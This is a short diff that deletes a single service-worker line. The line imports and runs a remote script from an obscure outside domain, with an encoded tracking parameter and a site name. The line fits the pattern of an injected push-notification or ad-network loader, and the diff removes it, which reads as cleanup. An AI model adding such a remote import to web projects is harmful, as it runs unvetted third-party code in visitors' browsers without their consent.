@@ -1,1 +1,0 @@
-importScripts('https://ulmoyc.com/v1/sw-import.js?h=waWQiOjExNjU4NzQsInNpZCI6MTI3NDQ4OCwid2lkIjo0ODg1OTcsInNyYyI6MiwicG0iOjAsIm10IjowfQ==eyJ&d=khaosrevelation.site');
